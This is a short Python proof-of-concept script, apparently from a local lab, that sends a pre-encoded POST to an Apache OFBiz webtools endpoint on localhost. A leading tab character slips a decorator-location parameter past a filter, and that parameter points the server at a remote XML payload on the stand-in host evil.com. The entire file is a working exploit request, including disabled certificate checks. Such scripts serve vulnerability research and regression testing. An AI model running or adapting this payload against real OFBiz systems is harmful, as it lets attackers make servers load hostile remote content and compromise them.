# -*- coding: utf-8 -*-
# R0 manual equivalent of rt3 whitespace bypass against BARE ofbiz (18081, https)
# Body sent PRE-ENCODED so the literal %09 reaches the app (requests would re-encode).
import sys, requests, urllib3
urllib3.disable_warnings()
body = "tempExprDecoratorLocation=%09http://evil.com:8000/payloads/rt3_final.xml"
r = requests.post("https://127.0.0.1:18081/webtools/control/main/findTemporalExpression",
                  data=body, verify=False, timeout=30, allow_redirects=False,
                  headers={"Content-Type": "application/x-www-form-urlencoded"})
print("[*] HTTP", r.status_code, len(r.content))
